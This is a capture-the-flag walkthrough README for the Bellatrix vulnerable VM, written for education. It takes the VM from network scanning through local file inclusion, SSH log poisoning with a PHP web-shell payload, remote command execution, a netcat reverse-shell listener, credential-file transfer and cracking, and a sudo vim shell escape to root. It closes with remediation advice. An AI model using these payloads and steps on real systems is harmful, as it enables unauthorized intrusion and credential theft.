# Bellatrix CTF Walkthrough

![Category](https://img.shields.io/badge/Category-Boot2Root-blue)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)
![Platform](https://img.shields.io/badge/Platform-Linux-lightgrey)
![Status](https://img.shields.io/badge/Status-Completed-success)
![Purpose](https://img.shields.io/badge/Purpose-Education-purple)

A structured walkthrough of the **Bellatrix Capture the Flag challenge**, covering network discovery, service enumeration, local file inclusion, log poisoning, remote code execution, credential recovery, SSH access, and Linux privilege escalation.

> [!IMPORTANT]
> This walkthrough is intended strictly for educational use in an authorized CTF or laboratory environment. Do not apply these techniques to systems you do not own or have explicit permission to test.

---

## Table of Contents

- [Overview](#overview)
- [Learning Objectives](#learning-objectives)
- [Lab Requirements](#lab-requirements)
- [Network Configuration](#network-configuration)
- [Attack Summary](#attack-summary)
- [1. Identify the Attacker IP Address](#1-identify-the-attacker-ip-address)
- [2. Discover the Target](#2-discover-the-target)
- [3. Enumerate Services](#3-enumerate-services)
- [4. Examine the Web Application](#4-examine-the-web-application)
- [5. Test for Local File Inclusion](#5-test-for-local-file-inclusion)
- [6. Enumerate Users and Log Files](#6-enumerate-users-and-log-files)
- [7. Perform Log Poisoning](#7-perform-log-poisoning)
- [8. Confirm Remote Code Execution](#8-confirm-remote-code-execution)
- [9. Obtain a Reverse Shell](#9-obtain-a-reverse-shell)
- [10. Stabilize the Shell](#10-stabilize-the-shell)
- [11. Locate and Transfer Credential Files](#11-locate-and-transfer-credential-files)
- [12. Recover the SSH Credential](#12-recover-the-ssh-credential)
- [13. Gain SSH Access](#13-gain-ssh-access)
- [14. Enumerate Sudo Privileges](#14-enumerate-sudo-privileges)
- [15. Escalate Privileges](#15-escalate-privileges)
- [16. Capture the Root Flag](#16-capture-the-root-flag)
- [Key Findings](#key-findings)
- [Security Recommendations](#security-recommendations)
- [Lessons Learned](#lessons-learned)
- [Suggested Repository Structure](#suggested-repository-structure)
- [Responsible-Use Disclaimer](#responsible-use-disclaimer)
- [Author](#author)
- [License](#license)

---

## Overview

Bellatrix is a vulnerable Linux virtual machine designed to test practical penetration-testing and enumeration skills.

The challenge demonstrates how multiple weaknesses can be combined:

1. An exposed web service
2. Information disclosure in HTML source code
3. Local file inclusion
4. Access to sensitive system logs
5. Log poisoning
6. Remote command execution
7. Credential recovery
8. Misconfigured `sudo` permissions
9. Privilege escalation through `vim`

The objective is to move from unauthenticated network access to a root shell and retrieve the final flag.

---

## Learning Objectives

By completing this lab, you should be able to:

- Discover hosts on a local virtual network
- Enumerate open ports and running services
- Inspect HTML source code for hidden resources
- Identify and validate local file inclusion
- Read sensitive Linux files through a vulnerable parameter
- Understand the concept of log poisoning
- Obtain and stabilize a reverse shell
- Transfer files from a target machine
- Recover credentials with John the Ripper
- Enumerate Linux `sudo` privileges
- Identify unsafe privileged binaries
- Escalate privileges in an authorized lab

---

## Lab Requirements

### Virtual Machines

- Kali Linux or another authorized penetration-testing distribution
- Bellatrix vulnerable virtual machine
- A hypervisor such as:
  - VMware Workstation
  - VMware Player
  - Oracle VirtualBox

### Tools

The walkthrough uses the following tools:

- `ip`
- `ifconfig`
- `netdiscover`
- `nmap`
- A web browser
- Metasploit Framework
- Netcat
- Python 3
- `wget`
- John the Ripper
- OpenSSH
- GTFOBins

### Environment Variables

Replace these placeholders with the addresses and port used in your lab:

```bash
ATTACKER_IP="<KALI_IP>"
TARGET_IP="<BELLATRIX_IP>"
LPORT="<LISTENING_PORT>"
```

Example private laboratory addresses might look like:

```text
ATTACKER_IP=192.168.x.x
TARGET_IP=192.168.x.x
LPORT=5555
```

Do not copy an address from this walkthrough without first verifying your own virtual network.

---

## Network Configuration

Configure both virtual machines so they can communicate within an isolated laboratory network.

Depending on the hypervisor, you can use:

- NAT
- NAT Network
- Host-only networking
- A custom isolated virtual network

> [!NOTE]
> Standard NAT does not always place virtual machines on the same guest-accessible subnet. A NAT Network or Host-only network may be more predictable for an isolated CTF environment.

Verify that both machines are connected to the intended virtual network before continuing.

---

## Attack Summary

```text
Host discovery
      |
      v
Port and service enumeration
      |
      v
Web source-code inspection
      |
      v
Local file inclusion
      |
      v
Sensitive log-file access
      |
      v
Log poisoning
      |
      v
Remote command execution
      |
      v
Reverse shell
      |
      v
Credential-file discovery
      |
      v
Password recovery
      |
      v
SSH access
      |
      v
Sudo enumeration
      |
      v
Vim privilege escalation
      |
      v
Root flag
```

---

## 1. Identify the Attacker IP Address

Begin by identifying the IP address and network interface assigned to the Kali Linux machine.

Using the modern `ip` command:

```bash
ip address
```

Alternatively:

```bash
ifconfig
```

Record the address associated with the active virtual-network interface.

Assuming the interface belongs to a `/24` network, the scan range may resemble:

```text
192.168.x.0/24
```

> [!NOTE]
> `/24` is a CIDR prefix indicating that the first 24 bits represent the network portion. It should not be described simply as a Class C address because modern networks use classless addressing.

---

## 2. Discover the Target

Use `netdiscover` to locate active hosts on the laboratory network:

```bash
sudo netdiscover -P -i <INTERFACE> -r <NETWORK_RANGE>
```

Example:

```bash
sudo netdiscover -P -i eth0 -r 192.168.x.0/24
```

Review the discovered hosts and identify the address assigned to Bellatrix.

Set the result for subsequent commands:

```bash
TARGET_IP="<DISCOVERED_TARGET_IP>"
```

You can also use an Nmap ping scan:

```bash
sudo nmap -sn <NETWORK_RANGE>
```

---

## 3. Enumerate Services

Run an Nmap scan against the target:

```bash
sudo nmap -sS -sV -O -p- "$TARGET_IP"
```

For a more aggressive scan:

```bash
sudo nmap -A "$TARGET_IP"
```

### Observed Services

The target exposes services including:

- TCP port `22`, SSH
- TCP port `80`, HTTP

The open HTTP service provides the initial attack surface.

> [!TIP]
> Save scan results so they can be referenced later:

```bash
sudo nmap -sS -sV -O -p- "$TARGET_IP" -oA bellatrix-full-scan
```

---

## 4. Examine the Web Application

Open the target in a browser:

```text
http://<TARGET_IP>/
```

Inspect the page and review its HTML source code. A common shortcut is `Ctrl+U`.

The source code reveals a PHP resource:

```text
ikilledsiriusblack.php
```

Navigate to it:

```text
http://<TARGET_IP>/ikilledsiriusblack.php
```

Although the page appears visually similar, the endpoint accepts a parameter that requires further testing.

---

## 5. Test for Local File Inclusion

The page uses a `file` parameter:

```text
http://<TARGET_IP>/ikilledsiriusblack.php?file=/
```

A blank page alone does not conclusively prove a vulnerability. Test the parameter using a known, non-destructive Linux file:

```text
http://<TARGET_IP>/ikilledsiriusblack.php?file=/etc/passwd
```

If the contents of `/etc/passwd` are displayed, the application is vulnerable to **Local File Inclusion**, commonly abbreviated as LFI.

### Why This Matters

LFI may allow an attacker to read files that the web-service account can access, including:

```text
/etc/passwd
/var/log/apache2/access.log
/var/log/auth.log
```

The exact Apache log path depends on the Linux distribution and server configuration. Common locations include:

```text
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/httpd/access_log
```

---

## 6. Enumerate Users and Log Files

Read `/etc/passwd` through the vulnerable parameter:

```text
http://<TARGET_IP>/ikilledsiriusblack.php?file=/etc/passwd
```

Review usernames and home directories.

Next, inspect authentication-related logs:

```text
http://<TARGET_IP>/ikilledsiriusblack.php?file=/var/log/auth.log
```

The lab output reveals usernames associated with SSH activity, including:

```text
bellatrix
lestrange
```

These usernames become useful during later authentication testing.

> [!CAUTION]
> System log files can contain usernames, IP addresses, authentication events, and other sensitive operational data. Production web applications should never allow users to control filesystem inclusion paths.

---

## 7. Perform Log Poisoning

### Concept

Log poisoning occurs when attacker-controlled data is written into a system log and the vulnerable application later includes that log as executable server-side content.

In this challenge, an SSH authentication attempt is used to place a short PHP command handler into the authentication log.

Start Metasploit:

```bash
msfconsole
```

Search for the SSH login scanner:

```text
search auxiliary/scanner/ssh/ssh_login
```

Select the module using its full path rather than relying on a search-result number:

```text
use auxiliary/scanner/ssh/ssh_login
```

Display the available options:

```text
show options
```

Set the target and a test password:

```text
set RHOSTS <TARGET_IP>
set PASSWORD test
```

In the isolated challenge environment, set the username field to a minimal PHP command handler:

```php
<?php system($_GET["cmd"]); ?>
```

Review the options and run the module:

```text
show options
run
```

The authentication attempt should be recorded in the SSH authentication log.

> [!WARNING]
> Perform this technique only against the intentionally vulnerable Bellatrix machine in an isolated environment.

---

## 8. Confirm Remote Code Execution

Include the poisoned authentication log through the vulnerable `file` parameter and supply a simple command:

```text
http://<TARGET_IP>/ikilledsiriusblack.php?file=/var/log/auth.log&cmd=id
```

Additional validation commands include:

```text
&cmd=whoami
&cmd=pwd
&cmd=ls%20-la
```

If command output appears in the response, the LFI vulnerability has been converted into **Remote Code Execution**, or RCE.

Check whether Python 3 is available:

```text
&cmd=which%20python3
```

A typical result may be:

```text
/usr/bin/python3
```

---

## 9. Obtain a Reverse Shell

Start a Netcat listener on the Kali machine:

```bash
sudo nc -lvnp <LPORT>
```

For example:

```bash
sudo nc -lvnp 5555
```

Create a Python 3 reverse-shell command using the Kali machine's reachable IP address and the same port used by the Netcat listener. Pass the command through the vulnerable `cmd` parameter, URL-encoding special characters if required.

When executed successfully, the Netcat listener should receive a connection from the target.

Verify access:

```bash
whoami
id
hostname
pwd
```

> [!IMPORTANT]
> The callback address must be the Kali machine's address reachable from Bellatrix, not the target's address.

---

## 10. Stabilize the Shell

The initial shell may not support interactive applications or terminal-control features.

Spawn a pseudo-terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Set a terminal type:

```bash
export TERM=xterm
```

Additional local terminal steps may be useful. Press `Ctrl+Z`, then run:

```bash
stty raw -echo
fg
```

Press Enter and reset the terminal if necessary:

```bash
reset
export SHELL=/bin/bash
export TERM=xterm-256color
```

The exact stabilization sequence may vary by shell and terminal.

---

## 11. Locate and Transfer Credential Files

Enumerate the current directory:

```bash
ls -la
```

A Base64-looking directory is discovered:

```text
c2VjcmV0cw==
```

The name can be decoded locally:

```bash
echo 'c2VjcmV0cw==' | base64 -d
```

Navigate into it:

```bash
cd c2VjcmV0cw==
ls -la
```

The directory contains potentially useful files, including a hidden wordlist or dictionary file and:

```text
Swordofgryffindor
```

Inspect the file types:

```bash
file .secret*
file Swordofgryffindor
```

### Temporary File Transfer

From the directory containing the files, start a temporary Python HTTP server:

```bash
python3 -m http.server 8005
```

On Kali, download the required files:

```bash
wget "http://<TARGET_IP>:8005/<SECRET_FILE>"
wget "http://<TARGET_IP>:8005/Swordofgryffindor"
```

Stop the temporary server after the transfer by pressing `Ctrl+C`.

> [!TIP]
> Avoid using `0.0.0.0` as the destination in `wget`. It is a listening address, not normally the address clients should use to connect. Use the Bellatrix target IP instead.

---

## 12. Recover the SSH Credential

Use the discovered dictionary file with John the Ripper:

```bash
john --wordlist=<SECRET_FILE> Swordofgryffindor
```

Display recovered results:

```bash
john --show Swordofgryffindor
```

If recovery succeeds, John displays the corresponding account information.

> [!IMPORTANT]
> Do not commit recovered passwords, password hashes, flags, or other challenge secrets to a public repository. Use placeholders or screenshots with sensitive values redacted.

---

## 13. Gain SSH Access

Authenticate to the target using the recovered username and password:

```bash
ssh <USERNAME>@<TARGET_IP>
```

After connecting, verify the session:

```bash
whoami
id
hostname
pwd
ls -la
```

SSH provides a more reliable and interactive session than the original reverse shell.

---

## 14. Enumerate Sudo Privileges

Check the commands the compromised user is permitted to execute with elevated privileges:

```bash
sudo -l
```

Review the output carefully.

The challenge configuration indicates that `vim` can be executed with elevated privileges. Interactive programs such as text editors can become privilege-escalation paths when they are unnecessarily permitted through `sudo`.

---

## 15. Escalate Privileges

Consult the `vim` entry on GTFOBins in your authorized laboratory workflow.

The relevant shell-escape technique is:

```bash
sudo vim -c ':!/bin/sh'
```

Verify the resulting privilege level:

```bash
whoami
id
```

Expected result:

```text
root
```

### Root Cause

The privilege escalation is possible because:

1. The user can execute `vim` with `sudo`
2. `vim` supports shell execution
3. The shell inherits the editor's elevated privileges

This demonstrates why interactive binaries should not be granted unrestricted `sudo` access.

---

## 16. Capture the Root Flag

Navigate to the root user's home directory:

```bash
cd /root
ls -la
```

Locate the final flag:

```text
root.txt
```

Display it inside the authorized lab:

```bash
cat /root/root.txt
```

Do not publish the flag if the CTF rules prohibit spoilers.

---

## Key Findings

### 1. Information Disclosure

A sensitive PHP resource was disclosed in the page's HTML source.

**Impact:** Attackers can identify hidden endpoints and expand the application's attack surface.

### 2. Local File Inclusion

The `file` parameter allowed arbitrary local files to be included.

**Impact:** Sensitive files such as account information and server logs could be read.

### 3. Insecure Access to Authentication Logs

The web-service process could read the SSH authentication log.

**Impact:** The application exposed operational data and enabled log poisoning.

### 4. Log Poisoning

Attacker-controlled input was written to a log that could later be included by PHP.

**Impact:** Local file inclusion was escalated to remote command execution.

### 5. Weak Credential Protection

A password hash and a suitable wordlist were accessible from the compromised host.

**Impact:** The SSH credential could be recovered offline.

### 6. Unsafe Sudo Configuration

The compromised user could execute `vim` with elevated privileges.

**Impact:** The user could escape from `vim` into a root shell.

---

## Security Recommendations

### Prevent Local File Inclusion

Do not pass untrusted input directly to file-inclusion functions.

Avoid patterns such as:

```php
include($_GET['file']);
```

Use an explicit allowlist instead:

```php
<?php

$pages = [
    'home' => __DIR__ . '/pages/home.php',
    'about' => __DIR__ . '/pages/about.php',
];

$page = $_GET['page'] ?? 'home';

if (!array_key_exists($page, $pages)) {
    http_response_code(404);
    exit('Page not found');
}

require $pages[$page];
```

### Restrict Filesystem Permissions

- Prevent the web-service account from reading authentication logs
- Apply least-privilege permissions
- Review group membership for accounts such as `www-data`
- Separate application data from system logs

### Protect and Monitor Logs

- Sanitize or encode untrusted values before writing them to logs
- Monitor logs for scripting tags and command syntax
- Forward important logs to a separate logging system
- Alert on repeated failed SSH authentication attempts

### Harden SSH

- Disable unnecessary password authentication
- Prefer key-based authentication
- Enforce strong passwords where passwords remain enabled
- Apply rate limiting
- Monitor repeated authentication failures

### Secure Sudo Policies

- Do not grant privileged access to interactive editors unless necessary
- Avoid unrestricted `NOPASSWD` entries
- Use specific wrapper scripts where appropriate
- Audit privileged binaries against known shell-escape capabilities
- Apply the principle of least privilege

### Protect Sensitive Files

- Do not store password hashes beside custom wordlists
- Restrict access to backup and credential files
- Remove obsolete secrets
- Rotate exposed credentials
- Use established password-hashing algorithms with appropriate work factors

---

## Lessons Learned

This challenge demonstrates that a complete compromise does not always require a single critical vulnerability. Bellatrix was compromised by chaining several weaknesses:

```text
Information disclosure
+ Local file inclusion
+ Readable authentication logs
+ Log poisoning
+ Weak credential handling
+ Unsafe sudo permissions
= Full system compromise
```

The main lesson is that defense in depth matters. Fixing any major link in this chain could have prevented or limited the compromise.

---

## Suggested Repository Structure

```text
bellatrix-ctf-walkthrough/
├── README.md
├── LICENSE
├── assets/
│   ├── 01-network-discovery.png
│   ├── 02-nmap-scan.png
│   ├── 03-web-page.png
│   ├── 04-source-code.png
│   ├── 05-lfi.png
│   ├── 06-log-poisoning.png
│   ├── 07-reverse-shell.png
│   ├── 08-credential-recovery.png
│   ├── 09-sudo-enumeration.png
│   └── 10-root-access.png
└── notes/
    └── remediation.md
```

Reference screenshots in the README as follows:

```markdown
![Nmap scan results](assets/02-nmap-scan.png)
```

Before publishing screenshots, redact:

- Passwords
- Password hashes
- Flags
- Public IP addresses
- Personal information
- Session identifiers
- Unrelated usernames or hostnames

---

## Responsible-Use Disclaimer

This repository documents security-testing activities performed against an intentionally vulnerable virtual machine in an authorized laboratory environment.

The material is provided solely for:

- Cybersecurity education
- Capture the Flag exercises
- Defensive-security research
- Authorized penetration-testing practice

Do not use the techniques, commands, payloads, or procedures documented here against systems, networks, applications, accounts, or data you do not own or for which you do not have explicit written authorization.

The author does not encourage, endorse, or authorize unauthorized access, disruption, credential theft, data exfiltration, or any other unlawful or harmful activity. Users are solely responsible for ensuring that their actions comply with applicable laws, organizational policies, contractual obligations, and authorization requirements.

The information is provided **"as is"**, without warranties or guarantees of any kind. The author assumes no responsibility or liability for misuse, damage, loss, service interruption, legal consequences, or other outcomes arising from the use of this material.

Always conduct security testing within a controlled environment, define the scope before testing, maintain evidence of authorization, protect sensitive data, and follow responsible-disclosure procedures when vulnerabilities are identified.

---

## Author

**Udam Akume Gabriel**  
ICDFA Alumnus | Digital Forensics & Incident Response  
Nigeria

If you found this walkthrough helpful, consider starring the repository.

---

## License

This documentation may be released under the license included in the repository, provided that doing so does not conflict with the Bellatrix challenge's original distribution terms.

The Bellatrix virtual machine, challenge materials, names, and original assets remain the property of their respective creator or distributor. This walkthrough does not grant permission to redistribute third-party virtual-machine images or copyrighted challenge assets.
